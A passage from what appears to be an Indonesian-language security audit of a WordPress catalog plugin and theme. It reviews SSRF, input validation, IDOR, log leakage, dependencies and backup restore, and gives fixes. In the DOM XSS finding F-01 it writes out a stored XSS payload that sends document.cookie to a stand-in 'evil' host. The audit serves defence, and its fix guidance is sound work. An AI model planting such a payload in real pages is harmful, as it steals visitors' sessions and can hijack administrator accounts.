| Kode iklan (theme) | `options.php` + `settings_fields()` (nonce otomatis) + sanitize berbasis `unfiltered_html` | `themes/.../functions.php:501-511, 546-548` |

Catatan: `POST /push/subscribe|unsubscribe` tidak memakai nonce (`assets/push.js:28-32` tidak mengirim `X-WP-Nonce`). Ini **bukan** CSRF klasik karena route memang anonim — tanpa nonce WordPress justru men-set `current_user(0)`, jadi tidak ada aksi "atas nama user login" yang bisa dipalsukan. Risikonya adalah **abuse anonim** (lihat poin 1), bukan CSRF.

---

### 4. Cegah SSRF — ✅ LULUS (bagian terkuat dari proyek ini)

`lkc_validate_push_endpoint()` (`includes/web-push.php:196-220`) melakukan pertahanan berlapis sebelum endpoint disimpan dan sebelum dipakai cron:

- `wp_http_validate_url()` → menolak IP privat/reserved/loopback & scheme aneh (proteksi utama SSRF).
- Wajib `https`, tolak `user`/`pass` di URL, tolak port selain 443.
- **Allowlist domain eksplisit**: `fcm.googleapis.com`, `push.services.mozilla.com`, `apple.push.apple.com`, `push.apple.com` (plus subdomain via `str_ends_with($host, '.' . $domain)` — pengecekan suffix yang benar, tidak bisa diakali `evil-fcm.googleapis.com.attacker.tld`).
- Panjang ≤ 2048, hasil disimpan sebagai `esc_url_raw(..., ['https'])`.
- Client Guzzle dikonfigurasi `'allow_redirects' => false`, `timeout 5`, `connect_timeout 3` (`web-push.php:406`) → redirect-based SSRF bypass tertutup.
- Endpoint divalidasi ulang saat **subscribe dan unsubscribe**, dan nilai yang dikirim cron berasal dari DB yang sudah tervalidasi.

Tambahan yang relevan: **CVE-2026-69246 / GHSA-v5mv-p594-2x33** ("Guzzle: noncanonical host can bypass host-based checks", high, CVSS 7.2, dipublikasikan 2026-08-03) adalah bypass SSRF persis di kelas celah ini. Repo memakai **guzzle 7.15.5**, sedangkan patch pertama ada di **7.15.2** → **tidak terdampak**.

Sisa risiko (rendah, bukan SSRF): `_lk_video_url` / `_lk_subtitle_url` menerima host apa pun dan masih mengizinkan **`http://`** (`layar-katalog-core.php:397-413`). URL ini tidak pernah di-fetch server-side (hanya di-`<source src>` oleh browser), jadi bukan SSRF — tapi ini membuka mixed content dan memungkinkan editor mengarahkan player ke host tak tepercaya. **Rekomendasi:** batasi ke `https` saja dan sediakan filter allowlist domain CDN.

---

### 5. Cegah path traversal — ✅ LULUS

Grep menyeluruh atas `include`, `require`, `file_get_contents`, `fopen`, `readfile`, `glob`, `realpath`, `curl_` di kode orisinal menghasilkan **nol** penggunaan path dari input pengguna. Satu-satunya pemanggilan path adalah `pathinfo()` pada **hasil `wp_parse_url()`** untuk validasi ekstensi (`.mp4/.webm/.vtt/.srt`) di `layar-katalog-core.php:411, 425, 458, 1002, 1039` — tidak menyentuh filesystem.

Pemuatan file internal semuanya konstan: `vendor/autoload.php`, `includes/engagement.php`, `includes/web-push.php` (`layar-katalog-core.php:25-30`). Tidak ada template loader berbasis parameter `?page=`/`?file=`.

**Rekomendasi (hardening, bukan temuan):** tambahkan `index.php` kosong di tiap direktori plugin/tema (lihat F-09).

---

### 6. Validasi input API — ⚠️ SEBAGIAN

> **Status: ✅ diperbaiki di Core Plugin 1.5.0** — lihat bagian *Remediasi P1*. Ringkasan: `/push/subscribe` dan `/push/unsubscribe` kini mendeklarasikan skema `args` (`endpoint`, `keys`, `contentEncoding`) dengan `validate_callback` + `sanitize_callback`, dan callback membaca `get_param()`. Semua route tulis `lkc/v1` menolak body di atas `lkc_rest_max_body_bytes` (default 8 KB) dengan `413` **sebelum** WordPress mem-parse-nya — termasuk bila `Content-Length` berbohong, karena panjang body aktual ikut diukur. Batas `page` sudah diperbaiki di P0.

**Sudah baik:**
- `GET /catalog/search` mendeklarasikan `args` dengan `sanitize_callback` per parameter (`layar-katalog-core.php:2115-2158`), lalu **disanitasi ulang** di dalam callback (defense in depth, `2171-2201`).
- Nilai enum dibatasi allowlist: format (`animation|film|series|other`), status (`upcoming|ongoing|completed`), sort (`newest|oldest|rating|title`) — `layar-katalog-core.php:286-310`, `2203-2216`.
- `per_page` di-cap: `min(24, absint(...))` (`layar-katalog-core.php:2166`); kata kunci dipotong 100 char.
- Rating divalidasi regex ketat `^(?:[1-9]|10)$` + `is_scalar` + cast `(int)` (`engagement.php:196-199`).
- Kunci push: base64url strict (`^[A-Za-z0-9_-]+$`), panjang maksimum 256 char, dan **panjang hasil decode harus persis** 65 byte (p256dh) / 16 byte (auth) → `lkc_decode_base64url_key()` (`web-push.php:262-271`).
- `contentEncoding` hanya menerima `aesgcm`/`aes128gcm` (`web-push.php:284`).
- Semua query `$wpdb` memakai `prepare()` dengan placeholder bertipe (`engagement.php:50, 71, 110, 128, 201`).

**Celah:**
1. `POST /push/subscribe` dan `/push/unsubscribe` membaca `$request->get_json_params()` **tanpa skema `args`** (`web-push.php:276, 307`). Tidak ada batas ukuran body → payload JSON ratusan MB bisa memaksa PHP parse sampai batas memori (DoS murah, diperparah oleh absennya rate limit). **Fix:** deklarasikan `args` dengan `required`/`type`/`validate_callback`, dan tolak body > ~8 KB (`$request->get_header('content_length')`).
2. Parameter `page` pada `/catalog/search` hanya di-`max(1, absint())` tanpa batas atas (`layar-katalog-core.php:2167`) → `OFFSET` sangat besar pada `meta_query` = query mahal yang bisa dipicu anonim. **Fix:** cap ke `min(100, ...)`.
3. `lkc_request_value()` (`layar-katalog-core.php:1198-1203`) mengakses `$_GET` langsung. Aman karena selalu disanitasi di pemanggil dan `is_scalar` dicek, tapi tidak ada `isset($_GET)` nonce check — untuk form GET filter ini memang benar (tidak perlu nonce), hanya perlu dicatat.

---

### 7. Validasi output API — ⚠️ SEBAGIAN (1 temuan DOM XSS nyata)

**Sudah baik (sisi PHP):**
- Escaping konsisten di semua keluaran HTML: `esc_html`, `esc_attr`, `esc_url`, `esc_textarea` — termasuk nilai yang berasal dari `$_GET` (`lk_q` di-`esc_attr`, `layar-katalog-core.php:1301`).
- JSON-LD di-encode dengan `JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT` (`layar-katalog-core.php:2051`) → tidak bisa breakout dari `<script type="application/ld+json">`.
- Cache-Control tepat sasaran: data per-user `private, no-store, max-age=0` (`engagement.php:177`), data publik `public, max-age=60` (`layar-katalog-core.php:2265`).
- Route rating hanya mengembalikan agregat + `my_rating` milik pemanggil; `title_id` divalidasi `post_type === 'lk_title'` **dan** `post_status === 'publish'` (`engagement.php:166-172`) → tidak membocorkan draft.
- Search REST hanya mengembalikan field publik (`id, title, url, excerpt, date, image, genres, meta`) — tanpa email/author/meta privat.

**Temuan — F-01: DOM-based XSS di `player.js` (severity: Tinggi) — ✅ DIPERBAIKI di Core Plugin 1.4.1, teruji jsdom.**

```js
// plugins/layar-katalog-core/player.js:79-84
function findNextEpisodeLink() {
    var nav = document.querySelector( '.lk-episode-navigation__next' );
    if ( nav && nav.href ) {
        return { url: nav.href, title: nav.textContent.trim() };   // ← teks mentah
    }
}
function createOverlay( nextInfo ) {
    overlay.innerHTML =
        '<p class="lkc-autoplay-next"><a href="' + nextInfo.url + '">' + nextInfo.title + '</a></p>' + ...
}
```

Rantai serangan: judul episode di-render PHP dengan `esc_html()` (`layar-katalog-core.php:1464`) → aman di HTML. Tapi `nav.textContent` **mengembalikan teks mentah**, lalu disisipkan lewat `innerHTML` → markup jadi hidup. Editor ber-role **Author** (cukup `edit_posts`) dapat membuat episode berjudul `<img src=x onerror=fetch('//evil/'+document.cookie)>`; begitu video episode sebelumnya selesai diputar, overlay autoplay mengeksekusi script di browser **semua pengunjung**, termasuk Administrator → stored XSS + privilege escalation. Overlay ini hanya muncul jika `count($sources) > 1` (multi-source) — tapi tetap jalur kode produksi.

**Fix:** jangan merangkai HTML. Bangun elemen dengan `createElement` + `textContent`, atau minimal escape:
```js
var a = document.createElement( 'a' );
a.href = nextInfo.url;                 // URL sudah lolos esc_url() di PHP
a.textContent = nextInfo.title;        // textContent = tidak pernah di-parse sebagai HTML
```
Juga validasi protokol: `if ( ! /^https?:$/i.test( new URL( nextInfo.url ).protocol ) ) return;`

**Temuan turunan — F-05 (Rendah) — ✅ DIPERBAIKI di 1.4.1:** `assets/engagement.js` merangkai nilai dari `localStorage` langsung ke atribut via `innerHTML` (`data-lkc-resume-from="' + saved.time + '"`). Koreksi akurasi atas penilaian awal: guard numerik `saved.time > 10` membuat payload yang memuat tanda kutip **tidak lolos** (karena `Number('15"x')` = `NaN`), jadi jalur ini praktis tidak dapat dieksploitasi — tetap diperbaiki sebagai defense-in-depth: nilai di-`Number()` lebih dulu dan atribut diset lewat `setAttribute()`.

Catatan aman: `assets/catalog-filter.js:128` (`grid.innerHTML = newContent`) mengambil HTML dari **respons same-origin** hasil `fetch` halaman arsip yang sudah di-escape WordPress, dengan `credentials: 'same-origin'` — ini pola fragment-swap yang wajar, bukan XSS. `themes/layar-katalog/assets/lightbox.js` memakai `textContent` untuk caption → aman. `back-to-top.js` menyisipkan SVG statis → aman.

---

### 8. Admin route terlindungi — ✅ LULUS

- Semua `admin_post_*` handler: cek kapabilitas **sebelum** nonce, lalu `wp_die()` (`web-push.php:53-56, 88-91, 117-120`).
- Semua render halaman admin: `current_user_can('manage_options')` + `wp_die()` (`web-push.php:129-131`, `themes/layar-katalog/functions.php:525-527`).
- Registrasi menu memakai kapabilitas eksplisit `manage_options` (`web-push.php:37-46`, `functions.php:513-521`).
- Redirect pasca-aksi memakai `wp_safe_redirect()` (bukan `wp_redirect`) → menutup open redirect (`web-push.php:82, 93, 108, 110, 123`), dan parameter notice di-`sanitize_key()` + dicocokkan ke allowlist `$notices` sebelum di-echo (`web-push.php:143, 147-148`) → tidak ada reflected XSS lewat `?lkc_push_notice=`.
- Meta box: nonce + `current_user_can('edit_post', $post_id)` + tolak autosave/revision (`layar-katalog-core.php:667-676`).
- `register_post_meta()` memasang `auth_callback` → `current_user_can('edit_post', $post_id)` untuk **semua** meta `_lk_*` (`layar-katalog-core.php:140-142, 273, 280`) → tulis meta lewat `/wp/v2/lk_episode/{id}` tetap ter-gate kapabilitas.
- Post type/taksonomi memakai `capability_type => 'post'` + `map_meta_cap => true` (`layar-katalog-core.php:66-67, 100-101`) → mapping kapabilitas benar, tidak ada `publicly_queryable` yang membuka draft.

---

### 9. Ganti default password & titik sensitif — ⚠️ SEBAGIAN

> **Status: ✅ diperbaiki di Core Plugin 1.6.0** — kunci privat VAPID tidak lagi disimpan sebagai teks mentah di `wp_options`. Nilainya sekarang berupa envelope `lkc1:<iv>:<tag>:<ciphertext>` (AES-256-GCM) dengan kunci enkripsi diturunkan dari salt `auth` + `secure_auth` di `wp-config.php`. Nilai lama tetap terbaca dan dimigrasikan otomatis pada `admin_init`; envelope yang tidak dapat didekripsi (salt berubah) memicu notice admin yang menyebut jalur pemulihannya, bukan kegagalan senyap. Public key dibiarkan terbuka karena memang bukan rahasia. Teruji 17 assertion. Catatan operasional: sejak ini, **cadangan database tanpa `wp-config.php` tidak lagi bisa memulihkan push** — lihat `docs/BACKUP-RESTORE.md` §4.3.

**Bersih:** scan pola `api_key|secret|password|passwd|private_key|BEGIN ... PRIVATE KEY` atas seluruh kode orisinal (non-vendor) → **tidak ada** kredensial default, tidak ada password hardcoded, tidak ada kunci nyata yang ter-commit. Kunci privat VAPID **tidak pernah** ditampilkan kembali di UI (`web-push.php:170` hanya menulis "Tersimpan (tidak ditampilkan)"). `README.md` & `CONTRIBUTING.md` secara eksplisit melarang commit kunci privat. Opsi disimpan dengan `autoload = false` (`update_option(..., false)`, `web-push.php:81, 105`) → tidak ikut ter-load di setiap request dan tidak bocor ke object cache global.

**Titik sensitif yang perlu diaudit/diperkuat:**

| Titik sensitif | Lokasi | Risiko | Tindakan |
|---|---|---|---|
| VAPID **private key** | `wp_options.lkc_push_options` (plaintext) | Bocor lewat SQL injection lain, backup DB, akses phpMyAdmin, atau ekspor WP | Enkripsi at-rest dengan kunci dari `wp-config.php` (`AUTH_KEY`/konstanta khusus), atau setidaknya dokumentasikan bahwa backup DB = material kunci; siapkan prosedur rotasi (`lkc_handle_generate_vapid_keys` sudah menghapus semua langganan saat rotasi ✓) |
| Push endpoint + `auth_token` subscriber | `wp_lkc_push_subscriptions` | Endpoint = identifier sekaligus secret; `auth_token` adalah materi kriptografi | Jangan pernah muncul di log (lihat poin 15); pertimbangkan simpan hash + enkripsi `auth_token` |
| Rating user (user_id ↔ title_id) | `wp_lkc_user_ratings` | Pseudonymous personal data | Sudah ada cleanup `delete_user`/`before_delete_post` ✓ dan privacy policy content ✓ |
| Kode iklan global | `wp_options.layarkatalog_ads`, di-echo mentah ke `wp_head` | Eksekusi JS arbitrer di seluruh halaman | Sudah di-gate `unfiltered_html` saat sanitize (`themes/.../functions.php:473-482`) dan dibatasi 20.000 char ✓ — pertahankan, jangan longgarkan |
| `composer.lock` + `vendor/composer/installed.json` | dapat diakses publik via URL | Version disclosure → memudahkan pencarian exploit | Batasi akses web ke `vendor/` (lihat F-09) |
| Password admin WP | di luar repo | — | Tidak ada default yang di-set plugin; pastikan dokumentasi deploy mewajibkan password kuat + 2FA (WordPress tidak menyediakan ini dari tema/plugin) |

---

### 10. Audit endpoint — ❌ GAGAL (tidak ada audit trail)

> **Status: ✅ diperbaiki di Core Plugin 1.5.0** — lihat bagian *Remediasi P1*. Ringkasan: tabel `wp_lkc_audit_log` + halaman **Alat → Log Keamanan** (tab Audit dan CSP, paginasi, hapus ber-nonce, `manage_options`). Aksi yang dicatat dibatasi allowlist `lkc_audit_log_actions`; IP dan User-Agent disimpan sebagai HMAC-SHA256 bergaram `wp_salt('auth')`, bukan nilai mentah; cron harian `lkc_prune_security_logs` menghapus entri audit setelah 90 hari dan laporan pelanggaran yang tak terlihat lagi setelah 30 hari.

Tidak ada pencatatan untuk satu pun aksi sensitif. Grep `error_log|wp_audit|log` hanya menemukan 2 pemanggilan `error_log` di jalur push (`web-push.php:420, 456`) — keduanya justru **bermasalah** (poin 15), dan tidak ada yang bersifat audit.

Aksi yang seharusnya diaudit tetapi tidak dicatat:
- Rotasi kunci VAPID (`lkc_handle_generate_vapid_keys`) — menghapus **semua** langganan, tindakan destruktif.
- Penghapusan semua langganan (`lkc_handle_clear_push_subscriptions`) — destruktif.
- Perubahan `enabled`/`subject` push (`lkc_handle_save_push_settings`).
- Penyimpanan kode iklan global (`layarkatalog_sanitize_ads_settings`) — setara RCE di frontend bila akun admin dikompromikan.
- Tulis/hapus rating (`lkc_rest_save_user_rating`) — untuk deteksi rating bombing.
- Ledakan jumlah subscribe per IP (deteksi abuse).

**Rekomendasi:** tambah tabel `wp_lkc_audit_log` (atau hook ke plugin audit log bila ada) dengan kolom `actor_id, action, object_type, object_id, ip_hash, ua_hash, created_at`; simpan **hash** IP, bukan IP mentah, agar tidak menambah beban GDPR/UU PDP; sediakan halaman admin read-only ber-`manage_options`; rotasi/hapus entri > 180 hari.

**Inventaris endpoint (untuk ditempel ke dokumen audit — hasil penelusuran lengkap):**

*REST API namespace `lkc/v1` (semua di bawah `/wp-json/`):*

| Method | Route | Permission callback | Handler |
|---|---|---|---|
| GET | `/lkc/v1/catalog/search` | `__return_true` (publik) | `lkc_rest_catalog_search` |
| GET | `/lkc/v1/ratings/(?P<title_id>\d+)` | `__return_true` (publik) | `lkc_rest_get_user_rating` |
| POST | `/lkc/v1/ratings/(?P<title_id>\d+)` | `lkc_rest_can_rate_title` (login + `read`) | `lkc_rest_save_user_rating` |
| GET | `/lkc/v1/push/key` | `__return_true` (publik) | `lkc_rest_get_push_key` |
| POST | `/lkc/v1/push/subscribe` | `__return_true` (publik) | `lkc_rest_save_push_subscription` |
| POST | `/lkc/v1/push/unsubscribe` | `__return_true` (publik) | `lkc_rest_delete_push_subscription` |

*REST API core yang ikut terekspos oleh plugin:* `/wp/v2/lk_title`, `/wp/v2/lk_episode`, `/wp/v2/lk_genre` (`show_in_rest => true`), beserta meta `_lk_*` (`show_in_rest => true`, tulis dibatasi `auth_callback` → `edit_post`). Baca = publik untuk konten `publish`; tulis = sesuai kapabilitas post.

*Endpoint admin (`wp-admin/admin-post.php`):* `lkc_save_push_settings`, `lkc_generate_vapid_keys`, `lkc_clear_push_subscriptions` — semuanya `manage_options` + nonce.

*Shortcode yang menghasilkan permukaan klien:* `[lk_user_rating]`, `[lk_watchlist]`, `[lk_viewing_history]`, `[lk_watchlist_button]`, `[lk_episode_history_marker]`, `[lkc_push_toggle]`, `[lk_player]`, `[lk_share_buttons]`, `[lk_catalog_filters]`, `[lk_catalog_details]`, `[lk_episode_navigation]`, `[layarkatalog_ad_slot]`, `[layarkatalog_widget_area]`.

*Keluar (outbound):* cron `lkc_process_episode_push_batch` → HTTPS ke host push yang di-allowlist (batch 10, TTL 86400).

*Frontend AJAX non-REST:* `assets/catalog-filter.js` melakukan `fetch` HTML halaman arsip same-origin (`GET`, `credentials: 'same-origin'`) → bukan endpoint baru, tapi ikut perlu di-rate-limit di level server.

---

### 11. Verifikasi webhook — ⚠️ N/A sebagian

**Tidak ada webhook masuk** di proyek ini: tidak ada callback URL pihak ketiga, tidak ada `admin_post_*` dari penyedia eksternal, tidak ada signature verification yang hilang karena memang tidak ada webhook. Satu-satunya integrasi pihak ketiga bersifat **keluar** (kirim push ke FCM/Mozilla/Apple).

Yang ada dan sudah benar:
- **Integritas keluar:** setiap notifikasi ditandatangani JWT VAPID (ES256) oleh `minishlink/web-push` memakai kunci privat situs → push service memverifikasi identitas pengirim. Payload juga dienkripsi `aes128gcm` ke kunci per-browser.
- **Verifikasi masuk (pengganti webhook):** `POST /push/subscribe` memvalidasi endpoint + kunci kriptografi sebelum menyimpan (`web-push.php:272-303`).

Sisa risiko: `POST /push/unsubscribe` menghapus baris hanya berdasar `sha256(endpoint)` yang dikirim klien (`web-push.php:306-313`). Endpoint push berfungsi sebagai **bearer secret** — siapa pun yang mengetahuinya bisa mematikan langganan korban (denial, bukan data leak). Endpoint 100+ char acak, jadi tidak bisa ditebak; tetapi **bisa bocor lewat log** (poin 15) — itulah sebabnya F-06 penting.

**Rekomendasi bila nanti menambah webhook pembayaran/pihak ketiga:** verifikasi HMAC signature dengan `hash_equals()` atas body mentah (`file_get_contents('php://input')`, bukan `$_POST`), sertakan timestamp + toleransi 5 menit untuk anti-replay, simpan `event_id` unik untuk idempotency, dan selalu balas `200` hanya setelah signature valid.

---

### 12. Cek payment server — ✅ N/A (tidak ada permukaan pembayaran)

Grep atas `woocommerce|payment|checkout|price|invoice|xendit|midtrans|stripe|paypal` di seluruh kode orisinal menghasilkan **0 temuan**. Tidak ada gateway, tidak ada tabel transaksi, tidak ada panggilan ke server pembayaran, tidak ada penyimpanan data kartu.

Yang perlu dipastikan tetap aman jika pembayaran ditambahkan nanti: jangan pernah terima nominal dari klien, verifikasi signature webhook server-side, simpan hanya token (bukan PAN), pakai idempotency key, dan pisahkan log pembayaran dari log aplikasi.

---

### 13. Harga anti-tamper (nilai tidak boleh dari klien) — ✅ N/A + analog sudah benar

Tidak ada harga/keranjang/kuantitas. Namun pola "nilai bisnis yang ditentukan server" **ada** pada dua fitur, dan keduanya sudah benar:

- **Rating editorial `_lk_rating`**: hanya bisa ditulis lewat metabox/REST core oleh user dengan `edit_post` (`layar-katalog-core.php:312-317, 667-676`), disanitasi ke rentang numerik. Pengunjung anonim **tidak bisa** mengirim nilai ini.
- **Rating pengguna 1–10**: nilai divalidasi server-side dengan regex ketat `^(?:[1-9]|10)$` lalu di-cast `(int)` (`engagement.php:196-199`); `user_id` diambil dari `get_current_user_id()`, **bukan** dari payload (`engagement.php:204`); agregat (`COUNT`/`AVG`) dihitung di SQL, bukan di klien (`engagement.php:111-119`); `PRIMARY KEY (user_id,title_id)` + `$wpdb->replace` menjamin satu rating per akun secara enforcement DB, bukan hanya logika aplikasi.
- **Agregat yang dikirim ke browser** hanya dipakai untuk tampilan; nilai yang ditampilkan berasal dari respons server (`assets/engagement.js:236-239`), bukan dihitung ulang di klien.

Sisa catatan kecil: karena satu akun = satu rating tanpa rate limit, sebuah farm akun (atau bot yang bisa registrasi bila pendaftaran dibuka) tetap bisa memanipulasi rata-rata. Mitigasi: batasi registrasi, atau beri bobot/minimum umur akun sebelum rating dihitung.

---

### 14. Cek IDOR — ✅ LULUS

- `POST /ratings/{id}` menulis dengan `user_id => get_current_user_id()` (`engagement.php:204`) — **tidak ada** parameter `user_id` yang diterima dari klien, jadi tidak mungkin menulis/menimpa rating milik user lain.
- `GET /ratings/{id}` mengembalikan `my_rating` dari `get_current_user_id()` (`engagement.php:124-135`); transient agregat di-cache **tanpa** `my_rating`, lalu field itu di-set per pemanggil (`engagement.php:122-135`) → tidak ada kebocoran rating user lain lewat cache.
- `title_id` selalu `absint()` dan divalidasi tipe + status `publish` (`engagement.php:166-172`) → tidak bisa dipakai meng-enumerasi draft/private.
- Meta `_lk_*` lewat REST core dibatasi `auth_callback` (`layar-katalog-core.php:140-142, 273, 280`).
- Tidak ada objek lain yang dimiliki user (watchlist/riwayat murni localStorage; langganan push tidak terikat akun).

Satu-satunya objek "milik pihak lain yang bisa disentuh" adalah langganan push lewat endpoint (lihat poin 11) — secara teknis *insecure direct object reference* dengan endpoint sebagai ID, tetapi ID-nya kriptografis dan tidak dapat ditebak. **Risiko: rendah**, naik menjadi sedang jika endpoint bocor ke log.

---

### 15. Log jangan bocor secret — ⚠️ SEBAGIAN (temuan nyata)

**F-06 (Sedang):** kedua pemanggilan `error_log()` mencetak **pesan exception Guzzle mentah**:

```php
// includes/web-push.php:419-420
if ( defined( 'WP_DEBUG' ) && WP_DEBUG ) {
    error_log( 'Layar Katalog push initialization failed: ' . sanitize_text_field( $error->getMessage() ) );
}
// includes/web-push.php:455-456
    error_log( 'Layar Katalog push send failed: ' . sanitize_text_field( $error->getMessage() ) );
```

`GuzzleHttp\Exception\RequestException`/`ConnectException` menyertakan **URL lengkap request** dalam pesannya (mis. `cURL error 6: Could not resolve host ... for https://fcm.googleapis.com/fcm/send/<TOKEN_SUBSCRIBER>`). Token di path endpoint push adalah **kredensial per-browser**: siapa pun yang bisa membaca `wp-content/debug.log` (sering kali dapat diakses publik jika `WP_DEBUG_LOG` aktif tanpa proteksi web server!) bisa:
1. mengirim notifikasi palsu langsung ke browser korban, dan
2. memanggil `POST /lkc/v1/push/unsubscribe` untuk mematikan langganan korban.

`sanitize_text_field()` **tidak** membantu — ia hanya menghapus tag/baris ekstra, bukan menyaring URL.

Yang sudah benar: kunci privat VAPID tidak pernah ditulis ke log; tidak ada `var_dump`/`print_r` atas `$settings`; tidak ada logging payload push.

> **Status: ✅ diperbaiki di Core Plugin 1.4.1** — kedua pemanggilan diganti helper `lkc_log_push_error()` (`includes/web-push.php:37-66`) yang hanya mencatat stage, `get_class($error)`, kode HTTP bila tersedia, dan 8 karakter pertama `subscription_hash`.

**Fix:**
```php
$code = method_exists( $error, 'getResponse' ) && $error->getResponse()
    ? $error->getResponse()->getStatusCode()
    : 'n/a';
error_log( sprintf(
    'Layar Katalog push send failed for subscription %s (status %s).',
    substr( $row->subscription_hash, 0, 8 ),   // prefix hash, bukan endpoint
    $code
) );
```
Jangan pernah menyertakan `getMessage()` mentah, endpoint, atau `auth_token`. Tambahkan juga ke dokumentasi deploy: `debug.log` **wajib** diblokir dari akses web, dan `WP_DEBUG_DISPLAY` harus `false` di produksi.

---

### 16. Private source map — ✅ LULUS

Tidak ada bundler/build sama sekali (`package.json`, webpack, vite, esbuild: **tidak ada** di repo). Grep `sourceMappingURL` atas seluruh `.js`/`.css` → **0 hasil**. Tidak ada berkas `.map`. Semua JS dikirim apa adanya sebagai aset WordPress dengan cache-busting `filemtime()` (`layar-katalog-core.php:2282`, `engagement.php:309`, `web-push.php:335`).

Karena tidak ada source map, tidak ada risiko kebocoran kode internal lewat `.map` publik. Bila nanti menambahkan build step: pastikan `devtool: false` (atau `hidden-source-map`) untuk produksi, **jangan** unggah `.map` ke `wp-content`, dan simpan di artifact CI privat.

Catatan (bukan keamanan): karena tidak ada minifikasi, seluruh logika klien memang terbaca publik — itu normal untuk plugin WordPress open-source GPL.

---

### 17. Update dependency — ✅ LULUS (verifikasi live 2026-10-14)

Semua paket di `composer.lock` dicek terhadap GitHub Advisory Database (API `api.github.com/advisories?affects=<pkg>`):

| Paket | Versi repo | Advisory relevan | Status |
|---|---|---|---|
| `guzzlehttp/guzzle` | 7.15.5 | **GHSA-v5mv-p594-2x33 / CVE-2026-69246** (high, CVSS 7.2, SSRF host bypass) — patched 7.15.2 | ✅ Tidak terdampak |
| `guzzlehttp/psr7` | 2.13.1 | GHSA-c2w2-prh8-qm98 (2.12.3), GHSA-vm85-hxw5-5432 (2.12.1), GHSA-34xg-wgjx-8xph & GHSA-hq7v-mx3g-29hw (2.10.2), GHSA-wxmh-65f7-jcvw (2.4.5), GHSA-q7rv-6hp3-vh96 (2.1.1) | ✅ Semua sudah dilewati |
| `guzzlehttp/promises` | 2.5.3 | tidak ada | ✅ |
| `minishlink/web-push` | v11.0.0 | tidak ada; **v11.0.0 = rilis terbaru** (2026-07-23) | ✅ |
| `web-token/jwt-library` | 4.2.3 | GHSA-jc38-x7x8-2xc8 (high), GHSA-3prj-6hqw-cm82 (high), GHSA-5739-39v2-5754 & GHSA-6vvh-pxr4-25r7 (medium) — semua ≤ 4.1.7 / ≤ 3.4.10; **4.2.3 = rilis terbaru** (2026-09-12) | ✅ Tidak terdampak |
| `brick/math` | 1.0.0 | tidak ada | ✅ |
| `spomky-labs/base64url` v2.0.4, `spomky-labs/pki-framework` 1.6.3, `php-http/discovery` 1.20.0, `symfony/polyfill-php83` v1.43.0, seluruh `psr/*` | — | tidak ada | ✅ |

**0 advisory terbuka.** Dependency juga terkunci (`composer.lock` di-commit) dan dibundel sehingga host produksi tidak butuh Composer — sesuai `README.md`.

Celah proses (bukan temuan versi): **tidak ada mekanisme berkelanjutan**. Tidak ada CI, tidak ada `composer audit`, tidak ada Dependabot/Renovate, dan `vendor/` di-commit manual sehingga pembaruan mudah tertinggal. **Rekomendasi:** tambah GitHub Actions yang menjalankan `composer audit` + `composer outdated --direct` tiap minggu dan pada setiap PR, dengan `vendor/` diperbarui lewat PR otomatis.

---

### 18. Tes restore backup — ❌ GAGAL (belum ada)

> **Status: 🟡 runbook selesai di 1.6.0, latihannya diotomatiskan di 1.7.0; drill-nya sendiri masih harus dijalankan.** [`docs/BACKUP-RESTORE.md`](BACKUP-RESTORE.md) memuat inventaris lengkap — **empat** tabel plugin (`wp_lkc_push_subscriptions`, `wp_lkc_user_ratings`, `wp_lkc_audit_log`, `wp_lkc_csp_reports`), opsi `lkc_push_options` dan `layarkatalog_ads`, semua meta `_lk_*`, theme mods, dan `wp-config.php` yang sejak 1.6.0 menjadi syarat mutlak karena kunci VAPID dienkripsi dengan salt-nya — berikut perintah dump/restore, lima mode kegagalan yang nyata terjadi, checklist verifikasi 12 butir, dan log latihan kuartalan. Sejak 1.7.0 bagian mekanis drill itu dijalankan `tests/wp/rehearse-restore.sh` (lihat §6.1 runbook): dump → restore ke database sementara → verifikasi seluruh inventaris → bandingkan salt `wp-config.php` cadangan dengan yang live → cetak baris log. Pengaman destruktifnya diuji di CI. Yang tetap tidak bisa dikerjakan dari repo: **menjalankan** drill itu di staging, lalu memuat hasilnya di browser dan memastikan satu notifikasi uji benar-benar tiba.

Tidak ada dokumentasi, skrip, atau catatan uji restore di repo (`docs/` hanya berisi `PUBLISH-TO-GITHUB.md` dan `RESPONSIVE-CHECK.md`). `README.md` bahkan menyatakan pengujian staging masih tertunda.

Ini penting karena plugin menyimpan data di **tempat yang tidak otomatis tercakup** oleh backup "file + wp_posts" biasa:

1. **Tabel kustom** — `wp_lkc_user_ratings` dan `wp_lkc_push_subscriptions`, dibuat lewat `dbDelta()` di `plugins_loaded` (`engagement.php:19-64`). Banyak plugin backup hanya menyertakan tabel berawalan default atau melewatkan tabel kustom.
2. **Kunci privat VAPID** — di `wp_options.lkc_push_options`. Kalau opsi ini hilang saat restore, semua langganan push yang tersimpan menjadi **tidak berguna** (tidak bisa didekripsi/ditandatangani) → pengguna harus subscribe ulang. Kalau kunci dari backup berbeda dari yang dipakai browser, push gagal senyap.
3. **Flag versi skema** — `lkc_engagement_db_version` (`1.0`) dan `lkc_rewrite_version` (`1.3.0`). Bila restore mengembalikan DB lama tanpa flag ini, `flush_rewrite_rules()` bisa jalan di request frontend (`layar-katalog-core.php:2288-2296`) → biaya performa.
4. **Meta `_lkc_push_sent_at` / `_lkc_push_queued_at`** — penanda idempotensi broadcast. Restore ke waktu sebelum episode terbit dapat memicu **pengiriman ulang** notifikasi ke semua subscriber.

**Rekomendasi — runbook uji restore (jadwalkan tiap rilis + tiap kuartal):**
- [ ] Backup penuh (DB + `wp-content`) → restore ke staging dengan URL berbeda.
- [ ] Verifikasi `SHOW TABLES LIKE 'wp_lkc_%'` mengembalikan 2 tabel dan jumlah barisnya cocok.
- [ ] Verifikasi `get_option('lkc_push_options')` berisi `public_key`/`private_key` yang sama dengan sebelum backup.
- [ ] Kirim push uji ke 1 subscription nyata → notifikasi muncul.
- [ ] Verifikasi rating pengguna & agregat tampil benar di halaman judul.
- [ ] Simpan permalink sekali, cek `/katalog/`, `/episode/`, `/genre/*` kembali 200.
- [ ] Ukur dan catat RTO (waktu restore) serta RPO (kehilangan data maksimum) — targetkan terdokumentasi.
- [ ] Uji juga skenario **gagal**: restore DB tanpa `wp_options` baru, dan pastikan push tidak error fatal.

---

### 19. Security header — ❌ GAGAL

